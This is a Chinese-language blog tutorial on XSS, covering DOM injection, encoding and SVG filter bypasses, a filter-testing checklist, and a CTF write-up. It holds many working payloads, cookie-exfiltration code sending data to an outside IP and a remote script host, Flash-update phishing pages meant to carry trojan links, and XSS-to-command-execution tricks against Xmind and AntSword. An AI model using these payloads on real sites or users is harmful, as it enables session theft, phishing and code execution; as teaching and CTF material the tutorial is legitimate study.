先知社区_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p><p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;...&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code> 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p><p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Unicode编码</span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// 八进制编码</span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// 十六进制编码</span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure><p><img src="/" alt="img"></p><p>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 对javascript:进行HTML编码, 对alert进行Unicode编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><p>首先对“alert”进行JavaScript Unicode编码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p><p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code> 的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p><p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p><p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p><p>这是为什么呢？</p><p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code> 标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被 <code>&lt;svg&gt;</code> 标签自动解码了：</p><p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p><h1 id="测试流程思路"><a href="#测试流程思路" class="headerlink" title="测试流程思路"></a>测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p><p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p><ol><li>暴力测试（输入大量的payload，看返回结果）</li><li>根据正则推算</li><li>利用浏览器bug</li></ol><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code> 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p><p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p><p>（3）然后测试几种常见的XSS向量：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p><p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p><p>继续测试事件触发执行javascript：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看onmouseover事件是否被过滤。</p><p>测试一个无效的事件，看看他的过滤规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><blockquote><p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p></blockquote><h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p><h1 id="攻击面拓展"><a href="#攻击面拓展" class="headerlink" title="攻击面拓展"></a>攻击面拓展</h1><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><p>Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。</p><p>在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。</p><p>这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。</p><h3 id="Flash-弹窗钓鱼"><a href="#Flash-弹窗钓鱼" class="headerlink" title="Flash 弹窗钓鱼"></a>Flash 弹窗钓鱼</h3><ul><li>项目一地址：<a href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li></ul><p>该项目是模仿的 Flash Player 中文官网的页面：</p><p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p><p>需要在index.html中的加入我们制作的木马的链接地址：</p><p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p><ul><li>项目二地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li></ul><p>该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：</p><p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p><p>找到flash.js，搜索链接“<a href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可：</a></p><p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p><h3 id="使用-WScript-Shell-执行系统命令"><a href="#使用-WScript-Shell-执行系统命令" class="headerlink" title="使用 WScript.Shell 执行系统命令"></a>使用 WScript.Shell 执行系统命令</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li><p>Internet Explorer </p></li><li><p>在IE上打开设置中的Intertnet选项-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下</p><p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p></li></ul><p>WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p><p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="使用-child-process-执行系统命令"><a href="#使用-child-process-执行系统命令" class="headerlink" title="使用 child_process 执行系统命令"></a>使用 child_process 执行系统命令</h3><p>如果目标环境启用了 <strong>NodeJS</strong> 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;更多稀奇古怪的Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。</p><h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>漏洞利用很简单，在 “思维导图” 中输出 Payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p><p>切换到 “大纲” 中，按下一个功能键即可触发攻击：</p><p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p><p>由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。</p><p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d269b494-bb68-1.png)</p><p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p><h3 id="蚁剑的XSS-to-RCE"><a href="#蚁剑的XSS-to-RCE" class="headerlink" title="蚁剑的XSS to RCE"></a>蚁剑的XSS to RCE</h3><p><a href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p><p><a href="https://xz.aliyun.com/t/8167#toc-0">浅谈蚁剑RCE - 先知社区</a></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源的定义</p><p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p><p>同源的目的</p><blockquote><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p><p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p><p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p></blockquote><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><ul><li><p>cors（支持所有http请求）</p><p>CORS（Cross-Origin Resource Sharing）是一种跨域资源共享机制，它允许Web应用程序从不同的域名访问资源，而不受同源策略的限制。CORS机制需要在服务端进行配置，并且需要在每个跨域请求中添加特定的HTTP头部信息，例如“Access-Control-Allow-Origin”和“Access-Control-Allow-Methods”等。CORS机制可以支持各种类型的HTTP请求，包括GET、POST、PUT、DELETE等，因此它在Web应用程序中的应用非常广泛。</p></li><li><p>jsonp（只支持get请求）</p><p>JSONP（JSON with Padding）是一种利用<script>标签的GET请求实现跨域数据传输的技术，它通过在请求URL中添加一个回调函数名来实现跨域访问。由于JSONP是基于<script>标签的GET请求，不具备修改数据的能力，因此它不会引起CSRF漏洞。但是，由于JSONP仅支持GET请求，因此它的应用场景受到限制。</p></li></ul><h4 id="xss跨域"><a href="#xss跨域" class="headerlink" title="xss跨域"></a>xss跨域</h4><p>引入其他恶意script代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="string">&#x27;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/XXcxou&quot;;document.body.appendChild(window.s)&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="跨源资源共享-CORS"><a href="#跨源资源共享-CORS" class="headerlink" title="跨源资源共享--CORS"></a>跨源资源共享--CORS</h2><p><a href="http://huang-x-h.github.io/2015/03/11/cors-preflight/">XMLHttpRequest跨域预检</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</a></p><p>预检的response数据包</p><blockquote><p>Access-Control-Allow-Origin：告诉浏览器允许该源访问资源。<br>Access-Control-Expose-Headers：告诉浏览器允许获得除了基本响应头外的哪些响应头<br>Access-Control-Allow-Credentials: true 是否允许浏览器读取 response 的内容<br>Access-Control-Allow-Methods： 指定了访问资源时允许使用的请求方法<br>Access-Control-Allow-Headers： 指明了实际请求中允许携带的标头字段。</p></blockquote><p>携带cookie跨域</p><p><img src="/../images/image-20230320220034977-1686840019399.png" alt="image-20230320220034977"></p><p><a href="https://www.cnblogs.com/byErichas/p/15918919.html">https://www.cnblogs.com/byErichas/p/15918919.html</a></p><h2 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h2><h4 id="Apache-httpOnly-Cookie泄露-CVE-2012-0053"><a href="#Apache-httpOnly-Cookie泄露-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookie泄露( CVE-2012-0053)"></a>Apache httpOnly Cookie泄露( CVE-2012-0053)</h4><h4 id="CORS-cookie回显"><a href="#CORS-cookie回显" class="headerlink" title="CORS+cookie回显"></a>CORS+cookie回显</h4><p>例题</p><p><a href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p><p>条件1</p><blockquote><p>response数据包中</p><p>Access-Control-Allow-Headers: X-Requested-With，说明了我们可以通过<strong>XHR</strong>请求来访问网站</p><p><code>XMLHttpRequest</code>是用于在后台与服务器交换数据。如果设置XHR请求网站，那么请头部必然会带有：<code>Origin:xxx</code>，则会被服务器视为同源访问</p></blockquote><p>条件2</p><p>没有关闭debug模式，导致cookie回显</p><p><img src="/../images/39-1686840019399.png" alt="img"></p><p>利用<code>location.href</code>重定向到vps，从而带出cookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="CST-trace请求"><a href="#CST-trace请求" class="headerlink" title="CST--trace请求"></a>CST--trace请求</h4><p>TRACE 方法会返回原始请求报文，其中就包含了cookie</p><p><a href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p><h2 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h2><p><a href="https://wolke.cn/post/c8aa67d0.html">CORS跨域漏洞与JSONP劫持 | wolke</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p><a href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p><blockquote><p>CSP指的是Content Security Policy，即内容安全策略。它是一种安全机制，用于保护网站免受跨站脚本攻击（XSS攻击）、数据盗取等Web攻击的影响。<br>CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置。<br>通过CSP，网站管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被恶意脚本攻击的风险。</p></blockquote><p><img 